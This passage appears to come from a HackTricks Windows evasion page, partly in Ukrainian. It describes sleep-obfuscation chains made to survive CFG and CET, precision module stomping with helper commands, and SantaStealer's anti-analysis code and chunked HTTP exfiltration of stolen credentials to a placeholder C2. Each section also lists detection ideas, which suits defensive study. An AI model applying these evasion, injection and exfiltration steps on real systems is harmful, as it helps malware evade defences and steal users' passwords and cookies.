- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

On CFG-enabled targets, the first indirect jump into a mid-function gadget such as `jmp [rbx]` or `jmp rdi` will usually crash the process with `STATUS_STACK_BUFFER_OVERRUN` because the gadget is not present in the module's CFG metadata. To keep Ekko/Kraken-style chains alive inside hardened processes:

- Register every indirect destination used by the chain with `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` and `CFG_CALL_TARGET_VALID` entries.
- For addresses inside loaded images (`ntdll`, `kernel32`, `advapi32`), the `MEMORY_RANGE_ENTRY` must start at the **image base** and cover the **full image size**.
- For manually mapped/PIC/stomped regions, use the **allocation base** and allocation size instead.
- Mark not only the dispatch gadget, but also exports reached indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) and any attacker-controlled executable sections that will become indirect targets.

This turns ROP/JOP-style sleep chains from "works only in non-CFG processes" into a reusable primitive for `explorer.exe`, browsers, `svchost.exe`, and other endpoints compiled with `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement is noisy and can break on CET Shadow Stack systems because a spoofed `Rip` must still agree with the hardware shadow stack. A safer sleep-masking pattern is:

- Pick another thread in the same process and read its `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Backup the current thread's real TEB/TIB.
- Capture the real sleeping context with `GetThreadContext`.
- Copy **only** the real `Rip` into the spoof context, leaving the spoofed `Rsp`/stack state intact.
- During the sleep window, copy the spoof thread's `NT_TIB` into the current TEB so stack walkers unwind inside a legitimate stack range.
- After the wait finishes, restore the original TIB and thread context.

This preserves a CET-consistent instruction pointer while misleading EDR stack walkers that trust TEB stack metadata to validate unwinds.

### APC-based alternative: Kraken Mask

If timer-queue dispatch is too signatured, the same sleep-encrypt-spoof-restore sequence can be executed from a suspended helper thread using queued APCs:

- Create a helper thread with `NtTestAlert` as entrypoint.
- Queue prepared `CONTEXT` frames/APCs with `NtQueueApcThread` and drain them with `NtAlertResumeThread`.
- Store the chain state on the heap instead of the helper stack to avoid exhausting the default 64 KB thread stack.
- Use `NtSignalAndWaitForSingleObject` to atomically signal the start event and block.
- Suspend the main thread before restoring the TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) to reduce the race window where a scanner could catch a half-restored stack.

This swaps the `CreateTimerQueueTimer` + `NtContinue` signature for a helper-thread/APC signature while keeping the same RC4 masking and stack-spoofing goals.

Additional detection ideas
- `NtSetInformationVirtualMemory` with `VmCfgCallTargetInformation` shortly before sleeps, waits, or APC dispatch.
- `GetThreadContext`/`SetThreadContext` wrapped around `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, or `ConnectNamedPipe`.
- `NtQueryInformationThread` followed by direct writes into the current thread's TEB/TIB stack bounds.
- `NtQueueApcThread`/`NtAlertResumeThread` chains that indirectly reach `SystemFunction032`, `VirtualProtect`, or section-permission restoration helpers.
- Repeated use of short gadget signatures such as `FF 23` (`jmp [rbx]`) or `FF E7` (`jmp rdi`) as dispatch pivots inside signed modules.


## Precision Module Stomping

Module stomping виконує payloads з **`.text` section of a DLL already mapped inside the target process** замість виділення очевидної private executable memory або завантаження нового sacrificial DLL. Overwrite target має бути **loaded, disk-backed image**, чий code space може прийняти payload без пошкодження code paths, які процесу ще потрібні.

### Reliable target selection

Naive stomping against common modules such as `uxtheme.dll` or `comctl32.dll` є fragile: DLL може не бути завантажений у remote process, а занадто мала code region зламає процес. Надійніший workflow такий:

1. Enumerate target process modules і збережіть **names-only include list** DLL, які вже завантажені.
2. Спочатку build the payload і запишіть його **exact byte size**.
3. Scan candidate DLLs on disk і порівняйте PE section **`.text` `Misc_VirtualSize`** із payload size. Це важливіше за file size, бо відображає розмір executable section **when mapped in memory**.
4. Parse **Export Address Table (EAT)** і виберіть exported function RVA як stomp start offset.
5. Обчисліть **blast radius**: якщо payload перевищує selected function boundary, він overwrite'ить adjacent exports, розташовані після нього в memory.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Операційні нотатки
- Надавай перевагу DLLs, **already loaded** у віддаленому процесі, щоб уникнути telemetry від `LoadLibrary`/unexpected image loads.
- Надавай перевагу exports, які рідко виконуються цільовою application, інакше normal code paths можуть натрапити на stomped bytes до або після thread creation.
- Великі implants часто вимагають змінити shellcode embedding із string literal на **byte-array/braced initializer**, щоб весь buffer був коректно представлений у injector source.

Ідеї для detection
- Remote writes у **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість більш поширених private RWX/RX allocations.
- Export entry points, чиї in-memory bytes більше не збігаються з backing file на disk.
- Remote threads або context pivots, що починають execution всередині legitimate DLL export, перші bytes якого нещодавно були modified.
- Підозрілі `VirtualProtect(Ex)` / `WriteProcessMemory` sequences проти DLL `.text` pages, за якими слідує thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ілюструє, як modern info-stealers поєднують AV bypass, anti-analysis і credential access в одному workflow.

### Keyboard layout gating & sandbox delay

- Конфігураційний flag (`anti_cis`) перелічує installed keyboard layouts через `GetKeyboardLayoutList`. Якщо знайдено Cyrillic layout, sample додає порожній `CIS` marker і завершується перед запуском stealers, гарантуючи, що він ніколи не detonates на excluded locales, залишаючи hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Логіка `check_antivm` з кількома рівнями

- Варіант A проходить список процесів, хешує кожну назву за допомогою custom rolling checksum і порівнює її з вбудованими blocklists для debuggers/sandboxes; потім повторює checksum для імені комп’ютера та перевіряє working directories, такі як `C:\analysis`.
- Варіант B перевіряє system properties (process-count floor, recent uptime), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleeps, щоб помітити single-stepping. Будь-яке спрацювання зупиняє виконання ще до запуску modules.

### Fileless helper + подвійне ChaCha20 reflective loading

- Основний DLL/EXE вбудовує Chromium credential helper, який або скидається на диск, або вручну map’иться в memory; fileless mode самостійно розв’язує imports/relocations, тож жодних helper artifacts не записується.
- Цей helper зберігає DLL другого етапу, зашифровану двічі ChaCha20 (дві 32-byte keys + 12-byte nonces). Після обох проходів він reflectively завантажує blob (без `LoadLibrary`) і викликає exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Рутини ChromElevator використовують direct-syscall reflective process hollowing, щоб інжектити в живий Chromium browser, успадкувати AppBound Encryption keys і розшифровувати passwords/cookies/credit cards прямо з SQLite databases попри ABE hardening.


### Модульний in-memory collection & chunked HTTP exfil

- `create_memory_based_log` ітерує global `memory_generators` table function-pointer і запускає один thread на кожен увімкнений module (Telegram, Discord, Steam, screenshots, documents, browser extensions тощо). Кожен thread записує результати у shared buffers і повідомляє свій file count після ~45s join window.
- Після завершення все zip’ується за допомогою statically linked бібліотеки `miniz` як `%TEMP%\\Log.zip`. Потім `ThreadPayload1` спить 15s і передає archive шматками по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Кожен chunk додає `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, а останній chunk додає `complete: true`, щоб C2 знав, що reassembly завершено.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
